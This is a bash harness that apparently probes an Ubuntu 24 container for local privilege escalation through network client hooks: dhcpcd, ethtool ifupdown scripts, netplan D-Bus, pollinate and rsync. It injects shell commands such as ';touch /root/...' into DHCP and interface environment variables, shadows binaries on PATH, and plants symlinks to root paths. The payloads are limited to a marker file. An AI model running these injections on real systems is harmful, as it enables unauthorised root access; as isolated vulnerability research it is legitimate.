#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"
workspace="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
log="$workspace/logs/network-client-hooks.out"
mkdir -p "$workspace/logs"

docker exec -i "$container" bash -s >"$log" 2>&1 <<'EOS'
set -euo pipefail

base=/tmp/network-client-hooks
marker=/root/network-client-hooks-root-marker
rm -rf "$base"
rm -f "$marker" /tmp/network-client-hooks-root-marker
systemctl stop systemd-network-generator.service >/dev/null 2>&1 || true
mkdir -p "$base"
chmod 1777 "$base"

cleanup() {
  set +e
  rm -rf "$base"
  rm -f "$marker" /tmp/network-client-hooks-root-marker
  systemctl stop systemd-network-generator.service >/dev/null 2>&1 || true
  systemctl reset-failed dhcpcd.service dhcpcd@eth0.service pollinate.service rsync.service \
    networkd-dispatcher.service netplan-ovs-cleanup.service systemd-network-generator.service \
    systemd-networkd.service systemd-networkd.socket >/dev/null 2>&1 || true
}
trap cleanup EXIT

section() {
  printf '\n## %s\n' "$1"
}

stat_path() {
  local p="$1"
  if [ -e "$p" ] || [ -L "$p" ]; then
    stat -Lc '%A %U:%G %F %n' "$p" 2>&1 || true
  else
    printf 'MISSING %s\n' "$p"
  fi
}

section "target and identity"
cat /etc/os-release | sed -n '1,8p'
uname -a
id attacker
printf 'system_state=%s\n' "$(systemctl is-system-running 2>&1 || true)"
systemd-detect-virt -v 2>&1 || true
systemd-detect-virt -c 2>&1 || true

section "default package proof"
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  dhcpcd-base ifupdown ifupdown-ng netplan.io python3-netplan pollinate rsync ethtool \
  resolvconf openresolv systemd systemd-resolved networkd-dispatcher isc-dhcp-client \
  2>&1 | sort || true
for p in \
  /usr/lib/dhcpcd/dhcpcd-run-hooks \
  /usr/lib/dhcpcd/dhcpcd-hooks/20-resolv.conf \
  /usr/lib/dhcpcd/dhcpcd-hooks/50-timesyncd.conf \
  /etc/network/if-up.d/ethtool \
  /etc/network/if-pre-up.d/ethtool \
  /usr/bin/pollinate \
  /usr/bin/rsync \
  /usr/sbin/netplan \
  /usr/libexec/netplan/netplan-dbus \
  /usr/lib/systemd/systemd-resolved; do
  dpkg -S "$p" 2>&1 || true
done

section "default unit reachability"
systemctl list-unit-files --no-pager --no-legend \
  '*dhcpcd*' '*networkd*' '*netplan*' '*pollinate*' '*rsync*' '*resolv*' \
  2>&1 | sort || true
for u in \
  dhcpcd.service dhcpcd@eth0.service systemd-networkd.service systemd-networkd.socket \
  systemd-network-generator.service networkd-dispatcher.service netplan-ovs-cleanup.service \
  pollinate.service rsync.service systemd-resolved.service; do
  printf '\n### %s\n' "$u"
  systemctl show -p LoadState -p UnitFileState -p ActiveState -p SubState -p Result \
    -p ConditionResult -p FragmentPath -p User -p ExecStart "$u" 2>&1 || true
done
printf '\n### active network-ish services\n'
systemctl --type=service,socket,timer --state=active,running --no-pager 2>&1 \
  | grep -Ei 'dhcp|network|netplan|pollinate|rsync|resolv|systemd-networkd|ethtool' || true
pgrep -a dhcpcd 2>&1 || true
ss -lntupx 2>&1 | grep -Ei 'rsync|dhcp|resolve|networkd' || true

section "hook and state path inventory"
for p in \
  /usr/lib/dhcpcd /usr/lib/dhcpcd/dhcpcd-run-hooks /usr/lib/dhcpcd/dhcpcd-hooks \
  /etc/dhcpcd.conf /etc/dhcpcd.enter-hook /etc/dhcpcd.exit-hook /run/dhcpcd /run/dhcpcd/hook-state \
  /etc/network /etc/network/interfaces /etc/network/if-up.d /etc/network/if-pre-up.d \
  /etc/network/if-down.d /etc/network/if-post-down.d /etc/network/if-up.d/ethtool \
  /etc/network/if-pre-up.d/ethtool /etc/netplan /run/netplan /run/systemd/system/netplan-ovs-cleanup.service \
  /etc/systemd/network /run/systemd/network /usr/lib/systemd/network /usr/libexec/netplan \
  /etc/default/pollinate /etc/pollinate /etc/pollinate/add-user-agent /var/cache/pollinate \
  /etc/rsyncd.conf /etc/default/rsync /run/systemd/resolve/io.systemd.Resolve /etc/resolv.conf \
  /run/systemd/timesyncd.conf.d; do
  stat_path "$p"
done

section "relevant vulnerable-looking code paths"
printf '\n### dhcpcd hook runner sources hooks\n'
nl -ba /usr/lib/dhcpcd/dhcpcd-run-hooks | sed -n '1,16p;332,353p'
printf '\n### dhcpcd resolv.conf and timesyncd hooks\n'
nl -ba /usr/lib/dhcpcd/dhcpcd-hooks/20-resolv.conf | sed -n '9,18p;173,184p'
nl -ba /usr/lib/dhcpcd/dhcpcd-hooks/50-timesyncd.conf | sed -n '1,8p;24,44p'
printf '\n### ethtool ifupdown hooks\n'
nl -ba /etc/network/if-pre-up.d/ethtool | sed -n '1,40p'
nl -ba /etc/network/if-up.d/ethtool | sed -n '1,70p'
printf '\n### pollinate service and script trust boundary\n'
systemctl cat pollinate.service rsync.service netplan-ovs-cleanup.service systemd-network-generator.service \
  systemd-resolved.service 2>&1 | sed -n '1,260p'
nl -ba /usr/bin/pollinate | sed -n '22,28p;256,350p'
printf '\n### resolved/network polkit actions\n'
grep -RIn 'org.freedesktop.resolve1\|org.freedesktop.network1\|io.netplan.Netplan' \
  /usr/share/polkit-1/actions /usr/share/dbus-1/system.d 2>/dev/null | sed -n '1,260p' || true

section "attacker write boundary"
runuser -u attacker -- bash <<'ATTACKER_WRITE'
set +e
err=/tmp/network-client-hooks-write.err
for p in \
  /etc/dhcpcd.enter-hook \
  /usr/lib/dhcpcd/dhcpcd-hooks/99-attacker \
  /run/dhcpcd/hook-state/attacker \
  /etc/network/interfaces \
  /etc/network/if-up.d/99-attacker \
  /etc/network/if-pre-up.d/99-attacker \
  /etc/netplan/99-attacker.yaml \
  /run/netplan/99-attacker.yaml \
  /etc/systemd/network/99-attacker.network \
  /run/systemd/network/99-attacker.network \
  /run/systemd/system/netplan-ovs-cleanup.service \
  /etc/default/pollinate \
  /etc/pollinate/add-user-agent \
  /var/cache/pollinate/attacker \
  /etc/rsyncd.conf \
  /etc/default/rsync \
  /etc/resolv.conf \
  /run/systemd/timesyncd.conf.d/attacker.conf; do
  printf 'write %s -> ' "$p"
  if { printf x >"$p"; } 2>"$err"; then
    rm -f "$p"
    echo OK
  else
    printf 'FAIL: %s\n' "$(cat "$err" 2>/dev/null || true)"
  fi
done
rm -f "$err"
exit 0
ATTACKER_WRITE

section "attacker service and dbus triggers"
runuser -u attacker -- bash <<'ATTACKER_TRIGGERS'
set +e
for u in \
  dhcpcd.service dhcpcd@eth0.service systemd-networkd.service systemd-networkd.socket \
  systemd-network-generator.service networkd-dispatcher.service netplan-ovs-cleanup.service \
  pollinate.service rsync.service systemd-resolved.service; do
  echo "### attacker systemctl start $u"
  systemctl start "$u" 2>&1
done
echo "### attacker netplan get/generate/apply"
netplan get 2>&1 | sed -n '1,80p'
netplan generate 2>&1 | sed -n '1,120p'
netplan apply 2>&1 | sed -n '1,120p'
echo "### attacker netplan dbus methods"
cfg_out="$(busctl call --system io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Config 2>&1)"
printf '%s\n' "$cfg_out"
obj="$(printf '%s\n' "$cfg_out" | awk '/^o /{print $2}' | tr -d '"')"
echo "Config object: ${obj:-none}"
if [ -n "$obj" ]; then
  busctl call --system io.netplan.Netplan "$obj" io.netplan.Netplan.Config Set ss 99-attacker.yaml 'network: {version: 2}' 2>&1
  busctl call --system io.netplan.Netplan "$obj" io.netplan.Netplan.Config Apply 2>&1
  busctl call --system io.netplan.Netplan "$obj" io.netplan.Netplan.Config Cancel 2>&1
fi
echo "### attacker resolved inputs"
resolvectl status 2>&1 | sed -n '1,80p'
resolvectl flush-caches 2>&1
resolvectl reset-statistics 2>&1
resolvectl dns eth0 127.0.0.1 2>&1
resolvectl domain eth0 attacker.example 2>&1
resolvectl revert eth0 2>&1
exit 0
ATTACKER_TRIGGERS

section "attacker direct dhcpcd hook runner with hostile env"
runuser -u attacker -- bash <<'ATTACKER_DHCPCD'
set +e
base=/tmp/network-client-hooks
mkdir -p "$base/bin"
cat >"$base/bin/resolvconf" <<'SH'
#!/bin/sh
{ echo "fake_resolvconf_uid=$(id)"; echo "args=$*"; cat; } >>/tmp/network-client-hooks/fake-resolvconf.hit
exit 0
SH
cat >"$base/bin/systemctl" <<'SH'
#!/bin/sh
echo "fake_systemctl_uid=$(id) args=$*" >>/tmp/network-client-hooks/fake-systemctl.hit
exit 0
SH
cat >"$base/bin/logger" <<'SH'
#!/bin/sh
echo "fake_logger_uid=$(id) args=$*" >>/tmp/network-client-hooks/fake-logger.hit
exit 0
SH
chmod 755 "$base/bin/resolvconf" "$base/bin/systemctl" "$base/bin/logger"
PATH="$base/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
  interface=nch0 \
  reason=BOUND \
  if_configured=true \
  if_up=true \
  if_down=false \
  new_domain_name_servers='127.0.0.1;touch /root/network-client-hooks-root-marker' \
  new_domain_search='attacker.example' \
  new_ntp_servers='127.0.0.1;touch /root/network-client-hooks-root-marker' \
  /usr/lib/dhcpcd/dhcpcd-run-hooks 2>&1
echo "dhcpcd_run_hooks_rc=$?"
for f in /tmp/network-client-hooks/fake-*.hit; do
  [ -e "$f" ] && { echo "--- $f"; cat "$f"; }
done
/usr/sbin/dhcpcd --version 2>&1 | sed -n '1,20p'
/usr/sbin/dhcpcd -T eth0 2>&1 | sed -n '1,120p'
echo "dhcpcd_direct_rc=${PIPESTATUS[0]}"
exit 0
ATTACKER_DHCPCD

section "attacker direct ifupdown ethtool hooks"
runuser -u attacker -- bash <<'ATTACKER_ETHTOOL'
set +e
command -v ifup || echo "ifup missing"
command -v ifdown || echo "ifdown missing"
IFACE=eth0 IF_ETHERNET_PORT='tp;touch /root/network-client-hooks-root-marker' \
  IF_DRIVER_MESSAGE_LEVEL='1;touch /root/network-client-hooks-root-marker' \
  /etc/network/if-pre-up.d/ethtool 2>&1
echo "if_pre_up_ethtool_rc=$?"
IFACE=eth0 IF_ETHERNET_WOL='g 00:11:22:33:44:55' \
  IF_ETHERNET_AUTONEG='0x1;touch /root/network-client-hooks-root-marker' \
  IF_LINK_SPEED='1000;touch /root/network-client-hooks-root-marker' \
  IF_LINK_DUPLEX='full;touch /root/network-client-hooks-root-marker' \
  IF_OFFLOAD_GRO='off;touch /root/network-client-hooks-root-marker' \
  /etc/network/if-up.d/ethtool 2>&1
echo "if_up_ethtool_rc=$?"
exit 0
ATTACKER_ETHTOOL

section "attacker direct pollinate and rsync probes"
runuser -u attacker -- bash <<'ATTACKER_MISC'
set +e
base=/tmp/network-client-hooks
echo "### pollinate print user agent"
/usr/bin/pollinate --print-user-agent 2>&1 | sed -n '1,5p'
echo "### pollinate non-testing root-device attempt with default PATH"
/usr/bin/pollinate --server http://127.0.0.1:9 --device /root/network-client-hooks-root-marker --wait 1 2>&1
echo "pollinate_non_testing_rc=$?"
mkdir -p "$base/pollinate-bin"
cat >"$base/pollinate-bin/curl" <<'SH'
#!/bin/sh
echo "fake_curl_uid=$(id) args=$*" >>/tmp/network-client-hooks/fake-curl.hit
printf x
exit 0
SH
chmod 755 "$base/pollinate-bin/curl"
echo "### pollinate testing root-device ignored with fake curl"
PATH="$base/pollinate-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin" \
  /usr/bin/pollinate --testing --no-challenge --server http://127.0.0.1:9 --device /root/network-client-hooks-root-marker --wait 1 2>&1 | sed -n '1,80p'
echo "pollinate_testing_rc=${PIPESTATUS[0]}"
[ -e "$base/fake-curl.hit" ] && cat "$base/fake-curl.hit"
echo "### rsync daemon reachability"
rsync rsync://127.0.0.1/ 2>&1 | sed -n '1,40p'
echo "rsync_client_rc=${PIPESTATUS[0]}"
exit 0
ATTACKER_MISC

section "attacker userns netns root-hook feed attempt"
cursor="$(journalctl -n 0 --show-cursor 2>/dev/null | sed -n 's/^-- cursor: //p' | tail -n1 || true)"
( timeout 10 udevadm monitor --kernel --udev --property --subsystem-match=net >"$base/userns-monitor.log" 2>&1 || true ) &
mon=$!
sleep 1
runuser -u attacker -- unshare -Urn bash >"$base/userns.out" 2>&1 <<'ATTACKER_USERNS' || true
set +e
printf 'inner_id=%s\n' "$(id)"
printf 'uid_map=%s\n' "$(cat /proc/self/uid_map 2>/dev/null)"
printf 'gid_map=%s\n' "$(cat /proc/self/gid_map 2>/dev/null)"
grep -E '^(Uid|Gid|CapEff|NoNewPrivs):' /proc/self/status
for name in nch0 'nch;touch' 'nch space' 'nch.dot' 'default' 'all'; do
  printf 'ip link add <%s> -> ' "$name"
  ip link add name "$name" type dummy 2>&1
  rc=$?
  echo "rc=$rc"
  if [ "$rc" -eq 0 ]; then
    ip link set "$name" up 2>&1
    ip -o link show dev "$name" 2>&1
    sleep 0.2
    ip link del "$name" 2>&1
  fi
done
ATTACKER_USERNS
wait "$mon" || true
if [ -n "$cursor" ]; then
  journalctl --after-cursor "$cursor" --no-pager >"$base/userns-journal.log" 2>&1 || true
else
  journalctl -n 100 --no-pager >"$base/userns-journal.log" 2>&1 || true
fi
printf '\n### attacker userns output\n'
sed -n '1,220p' "$base/userns.out" 2>/dev/null || true
printf '\n### root udev monitor for userns devices\n'
grep -E 'nch0|nch;touch|nch space|nch.dot|default|all|ACTION=|INTERFACE=|SUBSYSTEM=' "$base/userns-monitor.log" \
  | sed -n '1,180p' || true
printf '\n### root journal for userns devices\n'
grep -E 'nch0|nch;touch|nch space|nch.dot|systemd-sysctl|networkd|dhcpcd|ethtool' "$base/userns-journal.log" \
  | sed -n '1,180p' || true
printf '\n### root initial namespace visibility\n'
ip -o link show | grep -E 'nch0|nch;touch|nch space|nch.dot' || echo "no userns devices in root netns"
find /run/udev/data -maxdepth 1 -type f -print0 2>/dev/null \
  | xargs -0 grep -H -E 'nch0|nch;touch|nch space|nch.dot' 2>/dev/null \
  | sed -n '1,80p' || true

section "root service starts after hostile attacker state"
runuser -u attacker -- bash <<'ATTACKER_STATE'
set +e
base=/tmp/network-client-hooks
mkdir -p "$base"
ln -sf /root/network-client-hooks-root-marker "$base/resolv.conf"
ln -sf /root/network-client-hooks-root-marker "$base/rsyncd.conf"
printf 'attacker controlled\n' >"$base/pollinate-input"
printf 'attacker controlled\n' >"$base/dhcpcd-state"
ls -l "$base"
exit 0
ATTACKER_STATE
for u in dhcpcd.service dhcpcd@eth0.service pollinate.service rsync.service \
  networkd-dispatcher.service netplan-ovs-cleanup.service systemd-network-generator.service; do
  echo "### root systemctl start $u"
  timeout 15 systemctl start "$u" 2>&1 || true
  systemctl show -p ActiveState -p SubState -p Result -p ConditionResult "$u" 2>&1 || true
done
systemctl reset-failed dhcpcd.service dhcpcd@eth0.service pollinate.service rsync.service \
  networkd-dispatcher.service netplan-ovs-cleanup.service systemd-network-generator.service >/dev/null 2>&1 || true

section "root proof and cleanup checks"
if [ -e "$marker" ] || [ -e /tmp/network-client-hooks-root-marker ]; then
  echo "ROOT_MARKER_PRESENT"
  ls -l "$marker" /tmp/network-client-hooks-root-marker 2>&1 || true
  cat "$marker" /tmp/network-client-hooks-root-marker 2>/dev/null || true
else
  echo "NO_ROOT_PAYLOAD_MARKER"
fi
find "$base" -maxdepth 2 \( -type f -o -type l \) 2>/dev/null | sort | while read -r p; do
  stat -c '%A %U:%G %n -> %N' "$p" 2>&1 || true
done
printf 'system_state_after=%s\n' "$(systemctl is-system-running 2>&1 || true)"
systemctl --failed --no-legend 2>&1 || true
EOS

sed -n '1,420p' "$log"
